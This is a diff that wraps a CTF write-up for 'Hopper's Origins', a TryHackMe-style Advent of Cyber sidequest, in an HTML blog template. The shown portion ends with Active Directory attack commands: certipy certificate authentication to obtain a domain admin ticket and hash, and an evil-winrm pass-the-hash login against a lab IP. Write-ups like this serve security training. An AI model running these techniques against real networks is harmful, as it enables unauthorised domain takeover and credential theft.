@@ -1,4 +1,72 @@
-<p>This one was a doozy with an appropriate difficulty rating of “Insane”. Accessing the room was a challenge in and of itself, and the only IP address you’re given, .250, is off limits! This room required techniques from multiple toolboxes including web app, active directory, linux &amp; windows privilege escalation, and tunneling through multiple domains and subdomains.</p>
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=eb9cabcd4b363910106548be1ef285241715c638">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Advent of Cyber 2025 Sidequest 0: Hopper’s Origins | Nate McGraw’s Security Blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Advent of Cyber 2025 Sidequest 0: Hopper’s Origins" />
+<meta name="author" content="Nate McGraw" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This one was a doozy with an appropriate difficulty rating of “Insane”. Accessing the room was a challenge in and of itself, and the only IP address you’re given, .250, is off limits! This room required techniques from multiple toolboxes including web app, active directory, linux &amp; windows privilege escalation, and tunneling through multiple domains and subdomains." />
+<meta property="og:description" content="This one was a doozy with an appropriate difficulty rating of “Insane”. Accessing the room was a challenge in and of itself, and the only IP address you’re given, .250, is off limits! This room required techniques from multiple toolboxes including web app, active directory, linux &amp; windows privilege escalation, and tunneling through multiple domains and subdomains." />
+<link rel="canonical" href="http://localhost:4000/ctfs/2026-1-11-hoppers-origins.html" />
+<meta property="og:url" content="http://localhost:4000/ctfs/2026-1-11-hoppers-origins.html" />
+<meta property="og:site_name" content="Nate McGraw’s Security Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-11T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Advent of Cyber 2025 Sidequest 0: Hopper’s Origins" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nate McGraw"},"dateModified":"2026-01-11T00:00:00-05:00","datePublished":"2026-01-11T00:00:00-05:00","description":"This one was a doozy with an appropriate difficulty rating of “Insane”. Accessing the room was a challenge in and of itself, and the only IP address you’re given, .250, is off limits! This room required techniques from multiple toolboxes including web app, active directory, linux &amp; windows privilege escalation, and tunneling through multiple domains and subdomains.","headline":"Advent of Cyber 2025 Sidequest 0: Hopper’s Origins","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctfs/2026-1-11-hoppers-origins.html"},"url":"http://localhost:4000/ctfs/2026-1-11-hoppers-origins.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Nate McGraw's Security Blog</h1>
+        </a>
+        <h2>Cybersecurity Writeups by Nate McGraw</h2>
+
+        <section id="downloads">
+            <a href="">Home</a>
+            <a href="/about.html">About Me</a>
+            <a href="https://github.com/njmbb8">Github</a>
+            <a href="https://www.linkedin.com/in/nate-mcgraw-521930176/">LinkedIn</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>This one was a doozy with an appropriate difficulty rating of “Insane”. Accessing the room was a challenge in and of itself, and the only IP address you’re given, .250, is off limits! This room required techniques from multiple toolboxes including web app, active directory, linux &amp; windows privilege escalation, and tunneling through multiple domains and subdomains.</p>
 
 <ul>
   <li><a href="#gaining-access-to-the-room">Gaining Access to the Room</a></li>
@@ -283,3 +351,8 @@ ImpersonateFromParentPid 504 cmd.exe "/c net localgroup 'remote desktop users ad
 <p>Once we have the certificate, we can use it to get a kerberos ticket as the domain admin as well as the admin’s hash using <code class="language-plaintext highlighter-rouge">certipy auth -pfx da.pfx -dc-ip 10.200.171.131</code>. We can then take the hash and use it in <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.200.171.131 -u administrator -H bc42803c87460f4a2bce81f190209b15</code> to get the final flags!</p>
 
 <p><img src="/assets/img/aoc2025/hoppers-origins/challenge_pwn.png" alt="enter image description here" /></p>
+
+      </section>
+    </div>
+  </body>
+</html>
